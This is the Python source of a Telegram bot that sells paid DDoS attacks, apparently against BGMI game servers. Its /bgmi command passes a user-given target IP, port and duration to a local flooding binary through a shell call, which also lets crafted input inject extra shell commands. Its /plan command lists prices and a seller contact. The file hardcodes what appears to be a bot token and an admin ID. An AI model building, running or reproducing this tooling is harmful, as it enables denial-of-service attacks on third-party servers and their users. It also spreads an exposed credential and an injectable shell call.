#!/usr/bin/python3

import telebot
import subprocess
import datetime
import os
import time
from threading import Timer

# Telegram bot token
TOKEN = '6976133669:AAGFTogzGASpeXK5d0CChGq_FeUskwTObsU'

# Create bot instance
bot = telebot.TeleBot(TOKEN)

# Admin user IDs
admin_ids = ["6022173368"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs already cleared ☑️."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ☑️"
    except FileNotFoundError:
        response = "No logs found ❎."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time = int(command[3])
            if time > 180:
                response = "Error: Maximum attack time is 180 seconds ❌."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)
                full_command = f"./bgmi {target} {port} {time} 217"
                subprocess.run(full_command, shell=True)
                response = f"Attack initiated on {target}:{port} \nComplete ✅"
        else:
            response = "Usage: /bgmi <target> <port> <time>"

    else:
        response = "You are not authorized 🤬"

    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    response = f"Attack started on {target} \nIP: {target} \nPort: {port} \nTime: {time}"
    bot.reply_to(message, response)

# Handler for /start command
@bot.message_handler(commands=['start'])
def welcome(message):
    response = "Welcome! Use /help for commands"
    bot.reply_to(message, response)

# Handler for /help command
@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = '''Available commands 🐒
/bgmi : For DDoS 😈
/rules : Read carefully 🦁
/mylogs : Check your attacks 🐎
/plan : Buy from @Rolex_ddos

For Admin Commands:
/admincmd : Admin only 😎'''
    bot.reply_to(message, help_text)

# Handler for /rules command
@bot.message_handler(commands=['rules'])
def rules_command(message):
    response = '''Follow these rules ⚠️:

- Only one rule: do not spam'''
    bot.reply_to(message, response)

# Handler for /plan command
@bot.message_handler(commands=['plan'])
def plan_command(message):
    response = '''Buy from @Rolex_ddos

Vip:
- Attack Time: 180 seconds
- After Attack Limit: one minute
- Concurrents Attack: 60

Price list: 
One day: 100 Rs
One week: 500
One month: 1500'''
    bot.reply_to(message, response)

# Handler for /admincmd command
@bot.message_handler(commands=['admincmd'])
def admin_command(message):
    response = '''Admin commands:

/add <userId> : Add new user
/remove <userId> : Remove user
/allusers : Authorized user list
/logs : All user logs
/broadcast : Broadcast message
/clearlogs : Clear log file
/setexpire : Set user expiration time'''
    bot.reply_to(message, response)

# Handler for /broadcast command
@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message to all users:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to {user_id}: {str(e)}")
            response = "Broadcast successfully sent ☑️."
        else:
            response = "Write a message 🦧."
    else:
        response = "Admin only ❗."

    bot.reply_to(message, response)

# Handler for unknown commands
@bot.message_handler(func=lambda message: True)
def unknown_command(message):
    response = "Sorry, I don't understand that command."
    bot.reply_to(message, response)

# Error handling for the bot
@bot.message_handler(content_types=['text'])
def handle_messages(message):
    bot.reply_to(message, "I don't understand that command. Use /help for assistance.")

# Polling to keep the bot running
if __name__ == "__main__":
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"Bot crashed with error: {e}. Restarting...")
            time.sleep(5)
